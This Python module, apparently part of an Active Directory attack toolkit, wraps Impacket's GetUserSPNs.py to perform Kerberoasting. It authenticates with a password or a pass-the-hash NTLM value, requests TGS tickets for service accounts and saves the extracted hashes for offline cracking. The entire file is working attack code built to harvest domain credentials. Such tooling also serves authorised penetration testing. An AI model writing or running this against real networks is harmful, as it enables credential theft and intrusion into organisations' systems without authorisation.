"""
Kerberoast Hash Extractor — Requests TGS tickets and extracts hashes.

Wraps Impacket's GetUserSPNs.py for authenticated Kerberoast attacks
with support for both password and pass-the-hash authentication.
"""

import subprocess
from pathlib import Path
from typing import List

from ..core.target import RoastingTarget


class KerberoastExtractor:
    """Extract Kerberoast TGS hashes via Impacket."""

    def __init__(self, domain: str, username: str, password: str = "",
                 ntlm_hash: str = "", dc_ip: str = "", output_dir: Path = None):
        self.domain = domain
        self.username = username
        self.password = password
        self.ntlm_hash = ntlm_hash
        self.dc_ip = dc_ip
        self.output_dir = output_dir or Path("roasting")

    def extract(self, targets: List[RoastingTarget]) -> List[str]:
        """Request TGS tickets and write hashes to disk."""
        print(f"\n{'=' * 60}")
        print("PHASE 2: KERBEROAST HASH EXTRACTION")
        print(f"{'=' * 60}")

        if not targets:
            print("[-] No Kerberoastable accounts found")
            return []

        print(f"[*] Requesting TGS tickets for {len(targets)} accounts...")

        hash_file = str(self.output_dir / "kerberoast_hashes.txt")
        cmd = self._build_command(hash_file)

        print(f"[*] Executing: {' '.join(cmd)}")

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

            if Path(hash_file).exists():
                with open(hash_file) as f:
                    hashes = [line.strip() for line in f if line.strip()]
                print(f"[+] Extracted {len(hashes)} Kerberoast hashes")
                return hashes
            else:
                print("[-] Hash file not created")
                if result.stderr:
                    print(f"    Error: {result.stderr[:300]}")
                return []

        except FileNotFoundError:
            print("[-] GetUserSPNs.py not found — install Impacket")
            return []
        except Exception as e:
            print(f"[-] Extraction failed: {e}")
            return []

    def _build_command(self, hash_file: str) -> List[str]:
        """Build the GetUserSPNs.py command line."""
        if self.ntlm_hash:
            return [
                "GetUserSPNs.py",
                f"{self.domain}/{self.username}",
                "-hashes", f":{self.ntlm_hash}",
                "-dc-ip", self.dc_ip,
                "-request",
                "-outputfile", hash_file,
            ]
        return [
            "GetUserSPNs.py",
            f"{self.domain}/{self.username}:{self.password}",
            "-dc-ip", self.dc_ip,
            "-request",
            "-outputfile", hash_file,
        ]